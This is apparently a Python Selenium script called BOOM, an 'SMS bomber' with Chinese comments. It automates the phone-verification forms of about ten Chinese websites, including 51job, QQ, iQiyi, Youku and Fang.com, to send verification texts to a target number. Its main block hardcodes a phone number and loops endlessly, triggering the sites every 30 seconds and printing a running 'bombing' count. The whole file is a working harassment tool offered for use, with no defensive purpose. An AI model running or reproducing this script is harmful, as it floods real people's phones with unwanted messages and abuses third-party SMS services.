from threading import Thread
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains  # 为了实现定位到当前页面
import time  # 给缓冲时间


class BOOM():
    def __init__(self, phone, driver):
        self.phone = phone
        self.driver = driver
        self.num = 0  # 记录次数

    def Show(self, name):
        self.num = self.num+1
        print('手机号{}  被轰炸次数{}   {}网站   成功！'.format(self.phone, self.num, name))
        time.sleep(1)

    def QCWY(self, name):  # 前程无忧  需要休息60秒
        self.driver.get('https://www.51job.com/')
        time.sleep(3)
        self.driver.find_element_by_xpath(
            '//p[@class="op"]/a[1]').click()
        time.sleep(4)
        yanzhegnma = self.driver.find_element_by_xpath(
            "//span[@class = 'loginway']/a").click()
        tel = self.driver.find_element_by_xpath('//*[@id="loginname"]')
        tel.send_keys(self.phone)
        self.driver.find_element_by_xpath(
            '//span[@class="p_but geige"]').click()
        self.Show(name)

    def QQZC(self, name):  # QQ注册
        self.driver.get('https://ssl.zc.qq.com/v3/index-chs.html?from=pt')
        NC = self.driver.find_element_by_xpath('//*[@id="nickname"]')  # 昵称
        NC.send_keys('寂寞的云彩~')
        time.sleep(1)
        MM = self.driver.find_element_by_xpath('//*[@id="password"]')  # 密码
        MM.send_keys('123456abc')
        time.sleep(1)
        tel = self.driver.find_element_by_xpath('//*[@id="phone"]')
        tel.send_keys(self.phone)
        time.sleep(1)
        self.driver.find_element_by_xpath('//*[@id="send-sms"]').click()
        self.Show(name)

    def AQY(self, name):  # 爱奇艺
        self.driver.get('http://www.iqiyi.com/iframe/loginreg')
        time.sleep(1)
        self.driver.find_element_by_xpath(
            '/html/body/div[2]/div[1]/div/div/div[6]/div[2]/p/a').click()
        time.sleep(1)
        tel = self.driver.find_element_by_xpath(
            '/html/body/div[2]/div[2]/div[1]/div[1]/div[1]/div/div[1]/div[2]/input')
        tel.send_keys(self.phone)
        time.sleep(1)
        self.driver.find_element_by_xpath(
            '/html/body/div[2]/div[2]/div[1]/div[1]/div[1]/div/div[2]/i').click()
        time.sleep(1)
        self.driver.find_element_by_xpath(
            '/html/body/div[2]/div[2]/div[1]/div[1]/div[1]/div/a[2]').click()
        self.Show(name)

    def SJJY(self, name):  # 世纪佳缘   会到达上限
        self.driver.get('http://www.jiayuan.com/')
        time.sleep(1)
        self.driver.find_element_by_xpath(
            '//*[@id="index_reg_form"]/div/div/input').click()
        time.sleep(1)
        for handle in self.driver.window_handles:  # 始终获得当前最后的窗口，所以多要多次使用
            self.driver.switch_to_window(handle)
        tel = self.driver.find_element_by_xpath('//*[@id="phoneNumber"]')
        tel.send_keys(self.phone)
        time.sleep(1)
        yzm = self.driver.find_element_by_xpath(
            '//*[@id="mobile_vali"]').click()  # 只是为了得到button按钮
        time.sleep(3)
        # self.driver.find_element_by_xpath('//*[@id="get"]').click()  不成功
        click_button = self.driver.find_element_by_xpath(
            '//*[@id="get"]')  # 提交
        ActionChains(self.driver).click(click_button).perform()
        self.Show(name)

    def LPW(self, name):  # 猎聘网
        self.driver.get(
            "https://www.liepin.com/event/landingpage/search_newlogin2")
        time.sleep(1)
        tel = self.driver.find_element_by_xpath(
            '/html/body/div/div/div[2]/div/div[1]/form/div[1]/input')
        tel.send_keys(self.phone)
        time.sleep(1)
        self.driver.find_element_by_xpath(
            '/html/body/div/div/div[2]/div/div[1]/form/div[2]/a').click()
        self.Show(name)

    def GZ(self, name):  # 瓜子二手车
        self.driver.get(
            'https://www.guazi.com/nj/?ca_s=pz_sogou&ca_n=pz_bt&scode=10103000412')
        time.sleep(1)
        self.driver.find_element_by_xpath('//*[@id="js-login-new"]').click()
        time.sleep(1)
        tel = self.driver.find_element_by_xpath(
            '//*[@id="login1"]/form/ul/li[1]/input')
        tel.send_keys(self.phone)
        time.sleep(1)
        self.driver.find_element_by_xpath(
            '//*[@id="login1"]/form/ul/li[2]/button').click()
        self.Show(name)

    def WPH(self, name):  # 唯品会
        self.driver.get(
            "https://passport.vip.com/register?src=https%3A%2F%2Fwww.vip.com%2F")
        time.sleep(1)
        tel = self.driver.find_element_by_xpath('//*[@id="J_mobile_name"]')
        tel.send_keys(self.phone)
        time.sleep(1)
        self.driver.find_element_by_xpath('//*[@id="J_mobile_code"]').click()
        time.sleep(1)
        self.driver.find_element_by_xpath(
            '//*[@id="J_mobile_verifycode_btn"]').click()
        self.Show(name)

    def YK(self, name):  # 优酷登陆
        self.driver.get("http://www.youku.com")
        time.sleep(1)
        self.driver.find_element_by_xpath(
            '//*[@id="qheader_login"]/img').click()
        time.sleep(1)
        self.driver.find_element_by_xpath(
            '//*[@id="YT-showMobileLogin-text"]').click()
        time.sleep(1)
        self.driver.find_element_by_xpath(
            '//input[@id="YT-mAccount"]').send_keys(self.phone)
        self.driver.find_element_by_xpath(
            '//*[@id="YT-getMobileCode"]').click()
        self.Show(name)

    def YK1(self, name):  # 优酷注册
        self.driver.get("http://www.youku.com")
        time.sleep(1)
        self.driver.find_element_by_xpath(
            '//*[@id="qheader_login"]/img').click()
        time.sleep(1)
        self.driver.find_element_by_xpath('//*[@id="YT-registeBtn"]').click()
        time.sleep(1)
        self.driver.find_element_by_xpath(
            '//*[@id="YT-mPassport"]').send_keys(self.phone)
        # driver.save_screenshot("./youku.png")
        self.driver.find_element_by_xpath(
            '//*[@id="YT-mRegPassword"]').send_keys("123456abcdef")
        self.driver.find_element_by_xpath(
            '//*[@id="YT-mRepeatPwd"]').send_keys("123456abcdef")
        self.driver.find_element_by_xpath(
            '//*[@id="YT-mGetMobileCode"]').click()
        self.Show(name)

    def FTX(self, name):  # 房天下
        self.driver.get(
            r'https://passport.fang.com/NewRegister.aspx?backurl=https%3A%2F%2Fxingtai.fang.com%2F')
        time.sleep(3)
        self.driver.find_element_by_xpath(
            '//input[@id="strMobile"]').send_keys(self.phone)
        self.driver.find_element_by_xpath('//input[@id="vcode"]').click()
        self.Show(name)


if __name__ == '__main__':
    P = '16225082675' 
    D = webdriver.PhantomJS(
        r"D:\learn\phantomjs-2.1.1-windows\bin\phantomjs.exe")
    boom = BOOM(P, D)
    while True:
        boom.QCWY("1")
        boom.FTX("2")
        time.sleep(30)
